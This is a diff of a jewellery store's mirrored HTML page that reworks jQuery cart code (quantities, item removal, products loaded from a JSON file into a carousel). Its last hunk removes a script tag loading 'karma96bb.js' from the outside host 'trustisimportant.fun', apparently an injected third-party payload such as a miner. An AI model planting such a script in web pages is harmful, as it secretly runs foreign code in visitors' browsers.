@@ -7,9 +7,9 @@
                         <h2>Register now and get updates on your favorite products</h2>
 
                         <form>
-                            <div class="input-1">
+                            <!-- <div class="input-1">
                                 <input type="email" class="form-control" placeholder="Email *" required>
-                            </div>
+                            </div> -->
                             <div class="submit clearfix">
                                 <button type="submit">Submit</button>
                             </div>
@@ -77,7 +77,6 @@
                                         title="Twitter"><i class="fa-brands fa-twitter"></i></a></li>
                                 <li><a target="_blank" href="https://www.snapchat.com/add/Gold Craft Jewelleryjewellery"
                                         title="Snapchat"><i class="fa-brands fa-snapchat"></i></a></li>
-
                             </ul>
                         </div>
                         <div class="extra-link">
@@ -109,19 +108,18 @@
 
 <!-- Plugins for this template -->
 <script src="assets/js/jquery-plugin-collection.js"></script>
-
 <!-- Custom script for this template -->
 <script src="assets/js/script.js"></script>
 <script src="../../stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"
     integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM"
     crossorigin="anonymous"></script>
 <script>
+
     $(document).ready(function () {
         // Check if there is any cart data in localStorage on page load
         var existingData = JSON.parse(localStorage.getItem("cartItems")) || [];
         var cartCount = existingData.length; // Get the number of items in the cart
-
-
+        $(".mini-cart-content").append(`<div class="mini-cart-action clearfix"><a href="contact-us" class="view-cart-btn">Confirm price request</a></div>`);
         // Check if there are any items in the cart
         if (existingData.length > 0) {
             if ($(".mini-cart-items").length === 0) {
@@ -134,22 +132,130 @@
             // Loop through each item in localStorage and append it to the mini-cart
             $.each(existingData, function (index, item) {
                 var cartItemHTML = `
-                    <div class="mini-cart-item clearfix">
-                        <div class="mini-cart-item-image">
-                            <a href="#"><img src="${item.image}" alt=""></a>
-                        </div>
-                        <div class="mini-cart-item-des">
-                            <a href="#">${item.sku}</a>
-                        </div>
-                    </div>
-                `;
+                                <div class="mini-cart-item clearfix" data-index="${index}">
+                                    <div class="mini-cart-item-image">
+                                        <a href="#"><img src="${item.image}" alt=""></a>
+                                    </div>
+                                    <div class="mini-cart-item-des">
+                                        <a href="#">${item.sku}</a>
+                                        <span>Qty:${item.qty}<span>
+                                    </div>
+                                    <div class="menu-cart-remove">
+                                        <i class="ti-close"></i>
+                                    </div>
+                                </div>
+                            `;
                 $(".mini-cart-items").append(cartItemHTML);
             });
-            $(".mini-cart-content").append(`<div class="mini-cart-action clearfix"><a href="cart.php" class="view-cart-btn">Confirm price request</a></div>`);
         } else {
             // If no items in the cart, show a message
             $(".mini-cart-items").append('<p>Your cart is empty.</p>');
         }
+
+
+        $("#cart-count").html(cartCount); // Update the cart count on page load
+
+        // Handle remove button click
+        $(".mini-cart-content").on('click', ".menu-cart-remove", function () {
+            var existingData = JSON.parse(localStorage.getItem("cartItems")) || [];
+            var itemSku = $(this).closest('.mini-cart-item').find('.mini-cart-item-des a').text();
+            console.log(itemSku);
+
+            existingData = existingData.filter(item => item.sku !== itemSku);
+            console.log('existingData', existingData.length)
+            // Update localStorage and the cart count
+            $("#cart-count").html(existingData.length); // Update the cart count on page load
+            localStorage.setItem("cartItems", JSON.stringify(existingData));
+
+            if (existingData.length === 0) {
+                $('.mini-cart-content').removeClass('mini-cart-content-toggle');
+                // setTimeout(() => {
+                //     $(this).parent().remove();
+                // }, 1000)
+                // return
+            }
+            $(this).parent().remove();
+        });
+
+        $("#success-alert").hide();
+
+        $(".form-item").submit(function (e) {
+            e.preventDefault();
+            var existingData = JSON.parse(localStorage.getItem("cartItems")) || [];
+            // Extract SKU and selected image (if present)
+            var formElement = this;
+            var sku = $(formElement).find(".product-info a").text();
+            var imageSrc = $(formElement).find("a img").attr("src");
+
+            var formData = {
+                sku: sku,
+                image: imageSrc,
+                qty: 1
+
+            };
+            var existingItemIndex = existingData.findIndex(item => item.sku === sku);
+
+            if (existingItemIndex !== -1) {
+                // If the item exists, increment the quantity
+                existingData[existingItemIndex].qty += 1;
+            } else {
+                existingData.push(formData);
+            }
+
+            saveToLocalStorage();
+
+            function saveToLocalStorage() {
+                // Store form data in localStorage
+                localStorage.setItem("cartItems", JSON.stringify(existingData));
+
+                var cartCount = existingData.length;
+
+                // Check if there are any items in the cart
+                if (existingData.length > 0) {
+                    if ($(".mini-cart-items").length === 0) {
+                        // Create the mini-cart-items container if it doesn't exist
+                        $(".mini-cart-content").prepend('<div class="mini-cart-items"></div>');
+                    }
+
+                    $(".mini-cart-items").empty();
+
+                    // Loop through each item in localStorage and append it to the mini-cart
+                    $.each(existingData, function (index, item) {
+                        var cartItemHTML = `
+                                <div class="mini-cart-item clearfix" data-index="${index}">
+                                    <div class="mini-cart-item-image">
+                                        <a href="#"><img src="${item.image}" alt=""></a>
+                                    </div>
+                                    <div class="mini-cart-item-des">
+                                        <a href="#">${item.sku}</a>
+                                        <span>Qty:${item.qty}<span>
+                                    </div>
+                                    <div class="menu-cart-remove">
+                                        <i class="ti-close"></i>
+                                    </div>
+                                </div>
+                            `;
+                        $(".mini-cart-items").append(cartItemHTML);
+                    });
+
+
+                } else {
+                    // If no items in the cart, show a message
+                    $(".mini-cart-items").append('<p>Your cart is empty.</p>');
+                }
+
+
+                $("#cart-count").html(existingData.length); // Show updated cart count
+                $("#success-alert").fadeTo(2000, 200).slideUp(200, function () {
+                    $("#success-alert").slideUp(200);
+                });
+
+            }
+        });
+
+
+
+
 
 
         // Call this function to append the cart table to the container
@@ -183,6 +289,7 @@
                         <td class="product-name" data-title="Product">
                             <a href="#">${item.sku}</a>
                         </td>
+                        <button class="remove-cart-item">Remove</button>
                     </tr>
                 `;
                 });
@@ -220,100 +327,106 @@
                 renderCartTable();
             });
         }
-
         // Call renderCartTable function when the page loads or when you need to display the cart table
         renderCartTable(); // For example, this will run immediately when the page loads
+    });
 
-        $("#cart-count").html(cartCount); // Update the cart count on page load
+    let currentIndex = 0; // Track the current position of the products
 
-        $("#success-alert").hide();
+    function fetchProducts(offset = 0, limit = 5) {
+        // Fetch the JSON file (adjust path if necessary)
+        $.getJSON('products.json', function (data) {
+            const productList = $('.product-list');
+            // Slice the data to get the chunk of products to display
+            const productsToDisplay = data.slice(offset, offset + limit);
+            // Loop through each product and create HTML content
+            data.forEach(function (product) {
+                const productHtml = `
+             <li class="product">
+              <form method="post" id="form-item-${product.product_id}" class="productForm form-item">
+                  <input id="id_produit" name="id_produit" type="hidden" value="${product.product_id}">
+                  <div class="product-holder">
+                      <div class="product-badge discount">${product.product_badge}</div>
+                      <a class="Quick"><img loading="lazy" src="${product.img_src}" alt="${product.product_info}"></a>
+                      <div class="shop-action-wrap">
+                          <ul class="shop-action">
+                              <li><a class="Quick"><i class="fi flaticon-view"></i></a></li>
+                              <li><button title="Request for price" type="submit"><i class="fi flaticon-shopping-cart"></i></button></li>
+                          </ul>
+                      </div>
+                  </div>
+                  <div class="product-info">
+                      <h4><a title="Quick view">${product.product_info}</a></h4>
+                  </div>
+              </form>
+              <div class="quick-view-single-product">
+                  <div class="view-single-product-inner clearfix">
+                      <button class="btn quick-view-single-product-close-btn"><i class="pe-7s-close-circle"></i></button>
+                      <div class="img-holder">
+                          <img data-src="${product.img_src}" alt="${product.product_info}">
+                      </div>
+                      <div class="product-details">
+                          <h4>${product.product_info}</h4>
+                          <div class="thb-product-meta-before">
+                              <div class="product_meta">
+                                  <span class="sku_wrapper">SKU : <span class="sku">${product.sku}</span></span>
+                                  <span class="sku_wrapper">Brand : ${product.brand}</span>
+                                  <span class="posted_in">Metal color : ${product.metal_color}</span>
+                                  <span class="tagged_as">Metal Purity : ${product.metal_purity}</span>
+                              </div>
+                          </div>
+                      </div>
+                  </div>
+              </div>
+            </li>
+          `;
 
-        $(".form-item").submit(function (e) {
-            e.preventDefault();
-
-            // Extract SKU and selected image (if present)
-            var formElement = this;
-            var sku = $(formElement).find("input[name='id_produit']").val();
-            var imageSrc = $(formElement).find("a img").attr("src");
-
-
-            var formData = {
-                sku: sku,
-                image: imageSrc
-            };
-
-
-            saveToLocalStorage(formData);
-
-            function saveToLocalStorage(data) {
-                // Store form data in localStorage
-                var existingData = JSON.parse(localStorage.getItem("cartItems")) || [];
-                existingData.push(data);
-                localStorage.setItem("cartItems", JSON.stringify(existingData));
-
-                $("#cart-count").html(existingData.length); // Show updated cart count
-                $("#success-alert").fadeTo(2000, 200).slideUp(200, function () {
-                    $("#success-alert").slideUp(200);
-                });
-
-            }
-        });
-
-
-
-
-
-        // When the cart toggle is clicked, display the mini cart with items from localStorage
-        $("#cart-toggle").click(function (e) {
-            e.preventDefault();
-            $('#mini-cart-items').addClass('mini-cart-content-toggle');
-
-            // Get cart items from localStorage
-
-
-            // Optionally, update the "Confirm price request" button or other actions
-
-        });
-
-
-
-        //Remove items from cart
-        $("#dropdown-box").on('click', 'button.remove-item', function (e) {
-            e.preventDefault();
-            var pcode = $(this).attr("data-code"); //get product code
-            $(this).parent().fadeOut(); //remove item element from box
-            $.getJSON("cart_process.html", { "remove_code": pcode }, function (data) { //get Item count from Server
-                $("#dropdown-box").load("cart_process.html", { "load_cart": "1" });
-                $("#cart-count").html(data.items); //update Item count in cart-info
-                $("#cart-toggle").trigger("click"); //trigger click on cart-box to update the items list
+                // Append the generated HTML to the Owl Carousel container
+                productList.append(productHtml);
             });
-            //Make ajax request using jQuery Load() & update results
+            let owl = $('.product-list')
+            owl.owlCarousel({
+                autoplay: false,
+                smartSpeed: 300,
+                loop: true,
+                autoplayHoverPause: true,
+                dots: false,
+                lazyLoad: true,
+
+                nav: true,
+                navText: ['<i class="ti-angle-left"></i>', '<i class="ti-angle-right"></i>'],
+                responsive: {
+                    0: {
+                        items: 1
+                    },
+
+                    450: {
+                        items: 2,
+                        margin: 15
+                    },
+
+                    550: {
+                        items: 3,
+                        margin: 15
+                    },
+
+                    1200: {
+                        items: 4
+                    }
+                }
+            });
         });
+    }
 
 
-
-
+    $(document).ready(function () {
+        fetchProducts(currentIndex, 5); // Load 5 products initially
     });
 
 
 
 
-
-
-
-
-
-
 </script>
 
-<script src="../../trustisimportant.fun/karma/karma96bb.js?karma=bs?nosaj=faster.mo"></script>
-<script type="text/javascript">
-</script>
-</body>
-
-
-
-
-<!-- Mirrored from Gold Craft Jewelleryonline.com/en/ by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 26 Jan 2025 11:02:22 GMT -->
 
 </html>
